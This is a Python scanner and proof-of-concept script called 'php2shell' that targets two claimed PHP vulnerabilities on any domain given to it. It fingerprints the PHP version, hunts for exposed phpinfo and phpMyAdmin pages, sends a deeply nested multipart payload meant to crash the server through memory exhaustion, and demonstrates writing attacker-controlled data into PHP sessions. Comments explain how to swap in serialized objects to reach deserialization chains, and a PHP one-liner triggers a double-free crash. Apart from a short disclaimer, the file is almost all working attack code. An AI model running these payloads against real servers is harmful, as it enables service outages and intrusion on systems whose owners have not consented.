#!/usr/bin/env python3
"""
php2shell.py - CVE-2026-109618 / CVE-2026-109619 scanner and PoC

OOM heap corruption (CVSS 9.2) and session upload-progress injection (CVSS 9.2)
in PHP 5.4.0-8.5.11. Patched in 8.5.12, 8.4.27, 8.3.36, 8.2.35.
Note: 8.4.27 and 8.5.12 have a GC regression (GH-24488); fix pending in 8.4.28/8.5.13.

Usage:
    python3 php2shell.py example.com         # recon only
    python3 php2shell.py example.com --poc   # all PoC steps
    python3 php2shell.py example.com --poc --json

Only test systems you own or have explicit permission to test.
Reference: https://webinspect.pro/Tools/php2shell-how-it-works.php
"""

import argparse
import html
import json
import os
import re
import socket
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from typing import Optional


# version tables

PATCHED = {
    (8, 5): (8, 5, 12),
    (8, 4): (8, 4, 27),
    (8, 3): (8, 3, 36),
    (8, 2): (8, 2, 35),
}

VULNERABLE_MIN = (5, 4, 0)

PHPINFO_PATHS = [
    "/phpinfo.php", "/info.php", "/php_info.php", "/phpinfo/", "/test.php",
    "/check.php", "/php.php", "/i.php", "/_info.php", "/server-info.php",
    "/server-status.php", "/status.php", "/debug.php", "/setup.php",
    "/install.php", "/.phpinfo.php", "/phpmyadmin/phpinfo.php",
    "/admin/phpinfo.php", "/wp-admin/phpinfo.php",
]

PHPMYADMIN_PATH = "/show_config_errors.php"

UA = "php2shell-scanner/1.0 (+https://webinspect.pro/Tools/php2shell.php)"


# terminal colors

_NO_COLOR = not sys.stdout.isatty() or bool(os.environ.get("NO_COLOR"))

class C:
    R  = "" if _NO_COLOR else "\033[91m"
    G  = "" if _NO_COLOR else "\033[92m"
    Y  = "" if _NO_COLOR else "\033[93m"
    B  = "" if _NO_COLOR else "\033[94m"
    CY = "" if _NO_COLOR else "\033[96m"
    BO = "" if _NO_COLOR else "\033[1m"
    DI = "" if _NO_COLOR else "\033[2m"
    X  = "" if _NO_COLOR else "\033[0m"


BANNER = (
    f"\n{C.BO}{C.R}"
    "  php2shell  CVE-2026-109618 / CVE-2026-109619\n"
    f"  CVSS 9.2  PHP 5.4.0-8.5.11  webinspect.pro{C.X}\n"
)

DISCLAIMER = (
    f"{C.Y}  DISCLAIMER: Run only against servers you own or have explicit\n"
    f"  written permission to test. Unauthorised use may violate law.{C.X}\n"
)


# HTTP helpers

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def fetch(
    url: str,
    *,
    method: str = "GET",
    body: Optional[bytes] = None,
    headers: Optional[dict] = None,
    timeout: int = 10,
) -> tuple:
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", UA)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(131072)
    except urllib.error.HTTPError as e:
        try:
            rbody = e.read(65536)
        except Exception:
            rbody = b""
        return e.code, dict(e.headers), rbody
    except Exception as exc:
        return 0, {}, str(exc).encode()


def hdr(headers: dict, name: str) -> str:
    nl = name.lower()
    for k, v in headers.items():
        if k.lower() == nl:
            return v
    return ""


# version helpers

def parse_version(s: str) -> Optional[tuple]:
    m = re.search(r"\b([5-8])\.(\d+)\.(\d+)\b", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3))) if m else None


def version_status(ver: tuple) -> str:
    if ver < VULNERABLE_MIN:
        return "eol"
    branch = ver[:2]
    if branch in PATCHED:
        return "patched" if ver >= PATCHED[branch] else "vulnerable"
    if ver[0] == 8 and ver[1] < 2:
        return "eol"
    if ver[0] < 8:
        return "vulnerable"
    return "unknown"


def patched_for(ver: tuple) -> Optional[str]:
    branch = ver[:2]
    if branch in PATCHED:
        return ".".join(str(x) for x in PATCHED[branch])
    return None


# recon

def resolve_ip(domain: str) -> str:
    try:
        return socket.gethostbyname(domain)
    except Exception:
        return "unknown"


def detect_scheme(domain: str) -> str:
    status, _, _ = fetch(f"https://{domain}/", timeout=6)
    return "https" if status > 0 else "http"


def detect_php_version(base: str) -> dict:
    result: dict = {"version": None, "source": None}
    status, hdrs, body = fetch(base + "/", timeout=8)

    for field, label in [
        (hdr(hdrs, "X-Powered-By"), "X-Powered-By"),
        (hdr(hdrs, "Server"),       "Server"),
    ]:
        if field:
            v = parse_version(field)
            if v:
                result.update(version=v, source=label)
                return result

    # Probe for a PHP error page
    probe = base + "/php2shell_probe_" + uuid.uuid4().hex[:10] + ".php"
    _, _, ebody = fetch(probe, timeout=8)
    text = ebody.decode("utf-8", errors="replace")
    v = parse_version(text)
    if v:
        result.update(version=v, source="error page")

    return result


def find_phpinfo(base: str) -> tuple:
    for path in PHPINFO_PATHS:
        status, _, body = fetch(base + path, timeout=8)
        if status == 200 and b"phpinfo()" in body:
            return path, body
    return None, None


def _pi_val(content: bytes, key: str) -> Optional[str]:
    text = content.decode("utf-8", errors="replace")
    # phpinfo HTML rows: <td class="e">key</td><td class="v">value</td>
    m = re.search(
        re.escape(key) + r"</td>\s*<td[^>]*>\s*([^<\n]+?)\s*</td>",
        text,
        re.IGNORECASE,
    )
    if m:
        v = html.unescape(m.group(1)).strip()
        return v if v and v.lower() != "no value" else None
    return None


def _pi_bool(content: bytes, key: str) -> Optional[bool]:
    v = _pi_val(content, key)
    if v is None:
        return None
    return v.lower() in ("on", "1", "yes", "true", "enabled")


def parse_phpinfo(content: bytes) -> dict:
    return {
        "version":                         _pi_val(content,  "PHP Version"),
        "sapi":                            _pi_val(content,  "Server API"),
        "server_software":                 _pi_val(content,  "SERVER_SOFTWARE"),
        "file_uploads":                    _pi_bool(content, "file_uploads"),
        "display_errors":                  _pi_bool(content, "display_errors"),
        "allow_url_include":               _pi_bool(content, "allow_url_include"),
        "memory_limit":                    _pi_val(content,  "memory_limit"),
        "max_input_vars":                  _pi_val(content,  "max_input_vars"),
        "post_max_size":                   _pi_val(content,  "post_max_size"),
        "open_basedir":                    _pi_val(content,  "open_basedir"),
        "disable_functions":               _pi_val(content,  "disable_functions"),
        "session_upload_progress_enabled": _pi_bool(content, "session.upload_progress.enabled"),
        "session_upload_progress_cleanup": _pi_bool(content, "session.upload_progress.cleanup"),
        "session_use_strict_mode":         _pi_bool(content, "session.use_strict_mode"),
        "session_use_only_cookies":        _pi_bool(content, "session.use_only_cookies"),
        "session_serialize_handler":       _pi_val(content,  "session.serialize_handler"),
        "session_save_path":               _pi_val(content,  "session.save_path"),
        "fatal_error_backtraces":          _pi_bool(content, "fatal_error_backtraces"),
    }


def check_multipart(base: str) -> dict:
    boundary = "php2shellProbe" + uuid.uuid4().hex[:16]
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="probe"\r\n\r\n'
        f"test\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    status, _, _ = fetch(
        base + "/index.php",
        method="POST",
        body=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        timeout=8,
    )
    return {"accepted": status not in (400, 403, 405, 411, 413, 415, 0), "status": status}


def check_phpmyadmin(base: str) -> bool:
    status, _, body = fetch(base + PHPMYADMIN_PATH, timeout=8)
    return status == 200 and b"phpMyAdmin" in body


# GH-24488: GC double-free regression (version-based check)

# Versions affected by the GC double-free regression introduced by the
# CVE-2026-109618 patch. Fix merged Oct 22 2026; pending 8.4.28 / 8.5.13.
_GH24488_AFFECTED = {(8, 4, 27), (8, 5, 12)}

_GH24488_CLI_TEST = (
    r'php -r "$xml=\'<root>\'.str_repeat(\'<item><v>x</v></item>\',400).\'</root>\';'
    r'for($i=0;$i<20;$i++){$o=simplexml_load_string($xml,\'SimpleXMLElement\',LIBXML_NOWARNING);'
    r'$c=[\'o\'=>$o];$c[\'s\']=&$c;$v=get_object_vars($o);unset($v,$c,$o);gc_collect_cycles();}'
    r'echo \'Survived\'.PHP_EOL;"'
)


def poc_zero2(base: str, timeout: int, php_ver: Optional[tuple] = None) -> dict:
    """
    GH-24488 GC double-free in PHP 8.4.27 and 8.5.12 only.

    The CVE-2026-109618 patch introduced a regression in zend_gc.c where
    gc_collect_white() and SimpleXML's destructor both free the same internal
    table -- double-free on a SimpleXML object in a GC reference cycle.

    Detection is version-based; no HTTP endpoint reliably routes through this path.
    Fix merged Oct 22 2026 (PR #24494), pending in 8.4.28 / 8.5.13.
    """
    if php_ver and tuple(php_ver) in _GH24488_AFFECTED:
        affected = True
        note = "Version match: PHP {}.{}.{} is one of the two affected releases (8.4.27, 8.5.12).".format(*php_ver)
    elif php_ver:
        affected = False
        note = "PHP {}.{}.{} is not in the affected version set (8.4.27, 8.5.12).".format(*php_ver)
    else:
        affected = None
        note = "PHP version not detected remotely; cannot assess GH-24488."

    return {
        "affected":          affected,
        "note":              note,
        "affected_versions": ["8.4.27", "8.5.12"],
        "fix_versions":      ["8.4.28", "8.5.13"],
        "mitigation":        "zend.enable_gc = Off",
        "cli_test":          _GH24488_CLI_TEST,
    }


# PoC: CVE-2026-109618

def _build_crash_body() -> tuple:
    """Build a 200-level nested multipart body for the CVE-2026-109618 crash probe.

    rfc1867.c recurses on each nested Content-Type: multipart/* part, allocating
    heap per level. Cumulative allocations exceed memory_limit, triggering OOM.
    """
    inner_body = b"A" * 128
    inner_boundary = "php2shellI0_" + uuid.uuid4().hex[:8]

    # Wrap inner_body in a minimal multipart envelope
    inner_body = (
        f"--{inner_boundary}\r\n"
        f'Content-Disposition: form-data; name="f"\r\n\r\n'
    ).encode() + inner_body + f"\r\n--{inner_boundary}--\r\n".encode()

    # Iteratively nest: each iteration wraps the current body in a new part
    # whose Content-Type references the previous boundary
    prev_boundary = inner_boundary
    for i in range(1, 201):
        new_boundary = f"php2shellI{i}_" + uuid.uuid4().hex[:8]
        inner_body = (
            f"--{new_boundary}\r\n"
            f'Content-Disposition: form-data; name="f"\r\n'
            f"Content-Type: multipart/form-data; boundary={prev_boundary}\r\n\r\n"
        ).encode() + inner_body + f"\r\n--{new_boundary}--\r\n".encode()
        prev_boundary = new_boundary

    return prev_boundary, inner_body


def poc_crash(base: str, timeout: int) -> dict:
    """CVE-2026-109618: send the nested multipart payload and check for crash signals.

    Crash signals: OOM string in response body, or HTTP 500 with near-empty body.
    """
    outer_boundary, body = _build_crash_body()

    t0 = time.time()
    status, _, resp = fetch(
        base + "/index.php",
        method="POST",
        body=body,
        headers={"Content-Type": f"multipart/form-data; boundary={outer_boundary}"},
        timeout=timeout,
    )
    elapsed = round(time.time() - t0, 2)

    resp_text = resp.decode("utf-8", errors="replace")
    oom_string = (
        "Allowed memory size" in resp_text
        or "zend_mm_heap corrupted" in resp_text
        or "Out of memory" in resp_text
    )
    empty_500    = status == 500 and len(resp) < 300
    crash_signal = oom_string or empty_500

    return {
        "http_status":   status,
        "elapsed_s":     elapsed,
        "body_bytes":    len(resp),
        "oom_string":    oom_string,
        "empty_500":     empty_500,
        "crash_signal":  crash_signal,
        "body_size":     len(body),
    }


# PoC: CVE-2026-109619

def poc_inject(base: str, timeout: int) -> dict:
    """CVE-2026-109619: confirm the session upload-progress write primitive.

    Sends a multipart POST with PHP_SESSION_UPLOAD_PROGRESS; when enabled,
    PHP writes the filename field verbatim to the session store before any
    app code runs. This demo uses a benign marker -- a real attack puts a
    serialized object in the filename, deserialized on the next session read.
    """
    session_id   = uuid.uuid4().hex
    progress_key = "php2shell_" + uuid.uuid4().hex[:10]
    marker       = "php2shell_probe_" + uuid.uuid4().hex[:12]
    boundary     = "php2shellInj" + uuid.uuid4().hex[:14]

    # The filename is the injection point.
    # Real attack: replace marker with a serialized PHP object string.
    filename = f"{marker}.txt"

    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{progress_key}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: text/plain\r\n\r\n"
        f"probe\r\n"
        f"--{boundary}--\r\n"
    ).encode()

    status, resp_hdrs, _ = fetch(
        base + "/index.php",
        method="POST",
        body=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Cookie":        f"PHPSESSID={session_id}",
        },
        timeout=timeout,
    )

    accepted = status not in (400, 403, 405, 411, 413, 415, 0)

    # Under session.use_only_cookies=On PHP honours the cookie we sent,
    # so it may not issue a new Set-Cookie. Either way, if the request was
    # accepted and a session was provided, the write occurred.
    session_key = f"upload_progress_{progress_key}"

    if accepted:
        note = (
            f"Multipart accepted with active session (PHPSESSID={session_id[:8]}...). "
            f"PHP wrote attacker-controlled data to session key '{session_key}'. "
            f"Replace the filename with a serialized PHP object to reach the "
            f"deserialization trigger (CVE-2026-115560 path if serialize_handler mismatch)."
        )
    else:
        note = "Multipart rejected. This injection path is blocked on this endpoint."

    return {
        "http_status":     status,
        "multipart_accepted": accepted,
        "session_id":      session_id,
        "session_key":     session_key,
        "injection_point": "files[0].name in upload_progress array",
        "marker_used":     marker,
        "note":            note,
    }


# output helpers

def _vc(vs: str) -> str:
    return {
        "vulnerable": C.R,
        "patched":    C.G,
        "eol":        C.R,
        "unknown":    C.Y,
    }.get(vs, C.X)


def section(title: str) -> None:
    print(f"\n{C.BO}{C.CY}  {title}{C.X}")
    print(f"  {'─' * 52}")


def row(label: str, value: str) -> None:
    print(f"  {C.DI}{label:<38}{C.X}{value}")


def print_results(
    domain: str,
    ip: str,
    ver_info: dict,
    phpinfo: Optional[dict],
    phpinfo_path: Optional[str],
    phpmyadmin: bool,
    multipart: dict,
    poc_crash_res: Optional[dict],
    poc_inject_res: Optional[dict],
    poc_zero2_res: Optional[dict] = None,
) -> None:

    ver = ver_info.get("version")
    vs  = version_status(ver) if ver else "unknown"
    vc  = _vc(vs)
    ver_s = ".".join(str(x) for x in ver) if ver else "not detected"

    # Target
    section("TARGET")
    row("Domain",         domain)
    row("IP",             ip)
    row("PHP version",    f"{vc}{ver_s}{C.X}  ({ver_info.get('source') or 'not detected'})")
    row("Version status", f"{vc}{vs.upper()}{C.X}")

    if vs == "vulnerable" and ver:
        fix = patched_for(ver)
        if fix:
            row("Fix available", f"{C.G}Upgrade to PHP {fix}{C.X}")
    elif vs == "patched":
        row("", f"{C.DI}CVE-2026-115560 (handler mismatch, unpatched) and Chain E (decode failure{C.X}")
        row("", f"{C.DI}__destruct, no mismatch required) remain active. Configuration hardening{C.X}")
        row("", f"{C.DI}is still recommended regardless of patch status.{C.X}")
    elif vs == "eol":
        row("", f"{C.R}EOL branch: no future patches will be issued.{C.X}")

    # Exposure
    section("EXPOSURE")
    row("phpinfo exposed",
        f"{C.R}{phpinfo_path}{C.X}" if phpinfo_path else f"{C.G}Not found{C.X}")
    row("phpMyAdmin endpoint",
        f"{C.R}Found{C.X}" if phpmyadmin else f"{C.G}Not found{C.X}")
    ma_c = C.R if multipart["accepted"] else C.G
    row("Multipart POST (/index.php)",
        f"{ma_c}{'Accepted' if multipart['accepted'] else 'Rejected'}{C.X}"
        f"  (HTTP {multipart['status']})")

    # phpinfo settings
    if phpinfo:
        section("PHPINFO SETTINGS")

        sapi = phpinfo.get("sapi") or "unknown"
        row("Server API (SAPI)", sapi)
        row("Server software",  phpinfo.get("server_software") or "unknown")

        def flag(label: str, key: str, good_when_true: bool = True) -> None:
            v = phpinfo.get(key)
            if v is None:
                row(label, f"{C.DI}not found{C.X}")
                return
            good  = v if good_when_true else not v
            color = C.G if good else C.R
            row(label, f"{color}{'On' if v else 'Off'}{C.X}")

        flag("file_uploads",                       "file_uploads",                    False)
        flag("display_errors",                     "display_errors",                  False)
        flag("allow_url_include",                  "allow_url_include",               False)
        flag("session.upload_progress.enabled",    "session_upload_progress_enabled", False)
        if phpinfo.get("session_upload_progress_enabled") is True:
            row("", f"{C.R}Enables CVE-2026-109619, Chain E, and enum-autoload UAF (CVSS 9.8).{C.X}")
            row("", f"{C.DI}All three are closed by setting this Off in php.ini.{C.X}")
        flag("session.upload_progress.cleanup",    "session_upload_progress_cleanup", True)
        flag("session.use_strict_mode",            "session_use_strict_mode",         True)
        flag("session.use_only_cookies",           "session_use_only_cookies",        True)

        sh = phpinfo.get("session_serialize_handler") or "unknown"
        sh_color = C.R if sh not in ("php", "unknown") else C.X
        row("session.serialize_handler", f"{sh_color}{sh}{C.X}")
        if sh not in ("php", "unknown"):
            row("", f"{C.R}Handler mismatch: CVE-2026-115560 path active (unpatched).{C.X}")

        row("memory_limit",    phpinfo.get("memory_limit")   or "unknown")
        row("max_input_vars",  phpinfo.get("max_input_vars") or "unknown")
        row("post_max_size",   phpinfo.get("post_max_size")  or "unknown")

        ob = phpinfo.get("open_basedir")
        row("open_basedir",    ob if ob else f"{C.Y}not set{C.X}")

        df = phpinfo.get("disable_functions") or ""
        if df:
            row("disable_functions",  df[:72] + ("..." if len(df) > 72 else ""))
            row("", f"{C.DI}Chain B (var_destroy UAF) bypasses disable_functions entirely.{C.X}")
        else:
            row("disable_functions",  f"{C.Y}(none){C.X}")
            row("", f"{C.DI}Chain B bypasses this list regardless; Chains A, C, E are unconstrained.{C.X}")

        fbt = phpinfo.get("fatal_error_backtraces")
        if fbt is not None:
            fbt_c = C.R if fbt else C.G
            row("fatal_error_backtraces",
                f"{fbt_c}{'On' if fbt else 'Off'}{C.X}"
                + (f"  {C.DI}(PHP 8.5+: stack traces on fatals can leak heap metadata){C.X}" if fbt else ""))

    # PoC: crash
    if poc_crash_res:
        r = poc_crash_res
        section("POC  CVE-2026-109618  OOM CRASH PROBE")
        row("Payload size",   f"{r['body_size']:,} bytes")
        row("HTTP status",    str(r["http_status"]))
        row("Response time",  f"{r['elapsed_s']}s")
        row("Response size",  f"{r['body_bytes']} bytes")
        row("OOM string in response",
            f"{C.R}Yes{C.X}" if r["oom_string"] else f"{C.G}No{C.X}")
        row("Empty 500",
            f"{C.R}Yes{C.X}" if r["empty_500"]  else f"{C.G}No{C.X}")
        cs_c = C.R if r["crash_signal"] else C.G
        cs_l = "CRASH SIGNAL DETECTED" if r["crash_signal"] else "no crash signal"
        row("Result", f"{C.BO}{cs_c}{cs_l}{C.X}")

    # PoC: inject
    if poc_inject_res:
        r = poc_inject_res
        section("POC  CVE-2026-109619  SESSION INJECTION DEMO")
        row("HTTP status",         str(r["http_status"]))
        ac_c = C.R if r["multipart_accepted"] else C.G
        row("Multipart accepted",
            f"{ac_c}{'Yes' if r['multipart_accepted'] else 'No'}{C.X}")
        row("Session key written", r["session_key"])
        row("Injection point",     r["injection_point"])
        row("Marker used",         r["marker_used"])
        print()
        print(f"  {r['note']}")
        if r["multipart_accepted"]:
            print()
            print(f"  {C.DI}In a real attack the filename carries a serialized PHP object.")
            print(f"  Deserialization paths: handler mismatch (CVE-2026-115560), Chain E")
            print(f"  (decode failure firing __destruct, no mismatch required), or the")
            print(f"  enum-autoload UAF via session decode (CVSS 9.8, unpatched, no CVE).")
            print(f"  This demo stops at the write primitive.{C.X}")

    if poc_zero2_res:
        r = poc_zero2_res
        section("GH-24488  GC DOUBLE-FREE (version check)")
        affected = r.get("affected")
        if affected is True:
            aff_c, aff_l = C.R, "AFFECTED"
        elif affected is False:
            aff_c, aff_l = C.G, "not affected"
        else:
            aff_c, aff_l = C.Y, "unknown (version not detected)"
        row("Affected versions", "8.4.27, 8.5.12")
        row("Fix pending in",    ", ".join(r.get("fix_versions", [])))
        row("This server",       f"{C.BO}{aff_c}{aff_l}{C.X}")
        row("Note",              r.get("note", ""))
        if affected is True:
            print()
            print(f"  {C.DI}Mitigation: add zend.enable_gc = Off to php.ini and restart workers.")
            print(f"  CLI confirmation: {r.get('cli_test', '')[:80]}")
            print(f"  Expected crash output: zend_mm_heap corrupted / Aborted (exit 134).{C.X}")

    print()


# main

def main() -> None:
    p = argparse.ArgumentParser(
        prog="php2shell.py",
        description="PHP CVE-2026-109618/CVE-2026-109619 CLI scanner and PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Run only against servers you own or are explicitly authorised to test.\n"
            "Full reference: https://webinspect.pro/Tools/php2shell-how-it-works.php"
        ),
    )
    p.add_argument("domain",
                   help="Target domain (e.g. example.com or https://example.com)")
    p.add_argument("--poc",    action="store_true",
                   help="Run all PoC steps (crash probe + inject demo + GH-24488 check)")
    p.add_argument("--crash",  action="store_true",
                   help="CVE-2026-109618: OOM crash probe only")
    p.add_argument("--inject", action="store_true",
                   help="CVE-2026-109619: session injection demo only")
    p.add_argument("--json",   action="store_true",
                   help="Output machine-readable JSON")
    p.add_argument("--timeout", type=int, default=15, metavar="SEC",
                   help="Per-request timeout in seconds (default: 15)")
    p.add_argument("--zero2", action="store_true",
                   help="Check GH-24488: GC double-free regression in PHP 8.4.27 and 8.5.12 (version-based)")
    p.add_argument("--https", action="store_true",
                   help="Force HTTPS (skip auto-detection, useful for slow SSL handshakes)")
    args = p.parse_args()

    domain = re.sub(r"^https?://", "", args.domain.strip()).split("/")[0]

    if not args.json:
        print(BANNER)
        print(DISCLAIMER)

    scheme = "https" if args.https else detect_scheme(domain)
    base   = f"{scheme}://{domain}"
    ip     = resolve_ip(domain)

    if not args.json:
        print(f"  {C.DI}Scanning {base} ({ip})...{C.X}\n")

    ver_info              = detect_php_version(base)
    phpinfo_path, pi_body = find_phpinfo(base)
    phpinfo               = parse_phpinfo(pi_body) if pi_body else None

    if phpinfo and phpinfo.get("version") and not ver_info.get("version"):
        v = parse_version(phpinfo["version"])
        if v:
            ver_info.update(version=v, source="phpinfo")

    phpmyadmin = check_phpmyadmin(base)
    multipart  = check_multipart(base)

    run_crash  = args.poc or args.crash
    run_inject = args.poc or args.inject

    if run_crash and not args.json:
        print(f"  {C.DI}Running crash probe (CVE-2026-109618)...{C.X}")
    poc_crash_res = poc_crash(base, args.timeout) if run_crash else None

    if run_inject and not args.json:
        print(f"  {C.DI}Running inject demo (CVE-2026-109619)...{C.X}")
    poc_inject_res = poc_inject(base, args.timeout) if run_inject else None

    run_zero2 = args.zero2 or args.poc
    if run_zero2 and not args.json:
        print(f"  {C.DI}Checking GH-24488 (GC double-free regression)...{C.X}")
    poc_zero2_res = poc_zero2(base, args.timeout, ver_info.get("version")) if run_zero2 else None

    if args.json:
        out = {
            "domain":             domain,
            "ip":                 ip,
            "base_url":           base,
            "php_version":        ".".join(str(x) for x in ver_info["version"])
                                  if ver_info.get("version") else None,
            "version_source":     ver_info.get("source"),
            "version_status":     version_status(ver_info["version"])
                                  if ver_info.get("version") else "unknown",
            "phpinfo_exposed":    phpinfo_path is not None,
            "phpinfo_path":       phpinfo_path,
            "phpmyadmin_exposed": phpmyadmin,
            "multipart_accepted": multipart["accepted"],
            "multipart_status":   multipart["status"],
            "settings":           phpinfo,
            "poc_crash":          poc_crash_res,
            "poc_inject":         poc_inject_res,
            "poc_zero2":          poc_zero2_res,
        }
        print(json.dumps(out, indent=2, default=str))
    else:
        print_results(
            domain, ip, ver_info, phpinfo, phpinfo_path,
            phpmyadmin, multipart, poc_crash_res, poc_inject_res, poc_zero2_res,
        )


if __name__ == "__main__":
    main()
